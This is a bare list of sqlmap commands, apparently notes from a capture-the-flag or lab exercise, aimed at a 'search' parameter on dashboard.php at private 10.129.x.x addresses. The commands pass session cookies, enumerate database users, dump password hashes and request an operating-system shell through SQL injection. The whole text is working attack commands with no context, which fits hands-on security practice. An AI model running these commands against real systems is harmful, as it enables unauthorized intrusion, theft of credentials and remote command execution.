sqlmap -u "http://10.129.95.174/dashboard.php?search=nbvbn" --os-shell


sqlmap -u "http://10.129.95.174/dashboard.php?search=nbvbn" --cookie="PHPSESSID=libq4uj6l7ei5c8dr97dojpb9r" --os-shell


sqlmap -u 'http://10.129.52.53/dashboard.php?search=any+query' --cookie="PHPSESSID=2ihhrhn9lrvq6as0pmk0jhccgr" --batch --users

sqlmap -u 'http://10.129.52.53/dashboard.php?search=any+query' --cookie="PHPSESSID=2ihhrhn9lrvq6as0pmk0jhccgr" --batch --password

sqlmap -u 'http://10.129.52.53/dashboard.php?search=any+query' --cookie="PHPSESSID=2ihhrhn9lrvq6as0pmk0jhccgr" --batch --os-shell